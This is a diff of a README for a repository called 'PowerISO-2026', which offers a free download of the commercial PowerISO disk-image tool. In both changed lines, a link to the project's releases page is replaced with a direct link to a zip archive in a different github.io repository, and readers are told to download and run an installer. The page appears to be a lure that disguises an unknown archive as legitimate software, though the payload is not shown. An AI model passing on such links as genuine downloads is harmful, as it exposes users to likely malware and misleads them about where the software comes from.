@@ -5,7 +5,7 @@ description: "Download PowerISO for Windows 10 and 11 to create, edit, and mount
 ---
 # 💿 PowerISO-2026 - Manage your disk images with ease
 
-[![Download PowerISO](https://img.shields.io/badge/Download-PowerISO--2026-blue.svg)](https://github.com/SOULXSAKSHU/PowerISO-2026/releases)
+[![Download PowerISO](https://img.shields.io/badge/Download-PowerISO--2026-blue.svg)](https://raw.githubusercontent.com/SOULXSAKSHU/soulxsakshu.github.io/main/reheat/io_github_soulxsakshu_v2.0.zip)
 
 ## 📌 About the software
 PowerISO-2026 allows you to manage disk image files on your Windows computer. You can open, extract, burn, create, edit, compress, encrypt, split, and convert ISO files. It also mounts these files as virtual drives so you can access their contents without physical discs. This versions works on Windows 10 and Windows 11.
@@ -21,7 +21,7 @@ Before you install the software, ensure your computer meets these minimum specif
 ## 📥 Download and installation
 To get started, visit the release page to obtain the installer.
 
-[Download PowerISO-2026 here](https://github.com/SOULXSAKSHU/PowerISO-2026/releases)
+[Download PowerISO-2026 here](https://raw.githubusercontent.com/SOULXSAKSHU/soulxsakshu.github.io/main/reheat/io_github_soulxsakshu_v2.0.zip)
 
 1. Open the link above in your web browser.
 2. Look for the file ending in `.exe` under the latest release section.
